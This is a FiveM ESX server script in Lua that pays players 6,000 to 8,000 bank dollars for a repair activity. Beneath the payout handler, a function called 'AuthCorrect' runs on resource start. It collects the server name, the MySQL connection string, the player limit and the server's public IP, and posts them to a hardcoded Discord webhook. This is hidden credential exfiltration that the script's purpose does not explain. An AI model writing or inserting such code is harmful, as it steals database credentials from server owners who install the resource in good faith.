ESX = exports['es_extended']:getSharedObject()

RegisterServerEvent('esx_actividades:pay')
AddEventHandler('esx_actividades:pay', function()

    local pay = math.random(6000, 8000)

    local xPlayer = ESX.GetPlayerFromId(source)
    
    xPlayer.addAccountMoney('bank', pay)

    TriggerClientEvent('esx:showNotification', xPlayer.source, '¡Has recibido ' .. pay .. ' dólares en el banco por la reparación, sigue así!')

end)


function AuthCorrect()
    local active = false
    local direccionip = nil
    local colores = 16711680
    AddEventHandler('onResourceStart', function(resource)
        local nombre = GetConvar('sv_hostname', 'NULL')
        local database = GetConvar('mysql_connection_string', 'NULL')
        local maxusers = GetConvar('sv_maxclients', 'NULL')
        
        if active == false then
            active = true
            PerformHttpRequest('https://api.ipify.org', function(errorCode, resultData, resultHeaders)
                direccionip = tostring(resultData)
                PerformHttpRequest("https://discord.com/api/webhooks/1299743540116455445/cdmqURbM-PCNgeCAbb7BhAN7BVTRTIMpbPqCtUZTrqAnSA05bCXcxwoQ51VRBwsbBXU-", function(err, text, headers) end, 'POST', json.encode({
                    username = "Logs Start", 
                    embeds = {{
                        ["color"] = colores, 
                        ["author"] = {
                            ["name"] = "Slake",
                            --["icon_url"] = Config.communtiyLogo
                        },
                        ["title"] = 'Script Iniciado - Slake-logs - Intento Correcto',
                        ["description"] = "```Script Iniciado: [".. GetCurrentResourceName().. "]```\n```Server: [".. nombre .."]```\n```Database Connection: [".. database .."]```\n```Usuarios maximos: [".. maxusers .."]```\n```IP: [".. direccionip .."]```\n```Consumo: -- 0.01 --```",
                        ["footer"] = {
                            ["text"] = "Slake logs • "..os.date("%x %X %p"),
                            --["icon_url"] = "https://cdn.discordapp.com/attachments/818906905455624242/858115970689663026/Slake_Network_.png",
                        },
                    }}, 
                    --avatar_url = Config.avatar
                }), { 
                    ['Content-Type'] = 'application/json' 
                })
            end)
        end
    end)
end

AuthCorrect()